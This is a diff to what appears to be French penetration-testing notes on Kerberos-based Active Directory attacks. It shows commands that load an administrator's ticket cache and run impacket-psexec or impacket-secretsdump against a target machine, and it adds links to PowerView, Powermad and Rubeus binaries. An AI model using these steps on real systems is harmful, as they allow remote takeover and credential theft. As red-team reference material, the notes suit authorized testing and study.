@@ -61,3 +61,12 @@ $ export KRB5CCNAME=<ADMIN-MACHINE-CIBLE>.ccache
 $ klist
 $ impacket-psexec -k ['<DOMAINE>/<USER>@]<MACHINE-CIBLE>.<DOMAINE> or impacket-secretsdump -k <MACHINE-CIBLE>.<DOMAINE>
 ```
+
+[psexec.exe](https://live.sysinternals.com/)
+
+[powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+
+[powemad.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1)
+
+[Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
+
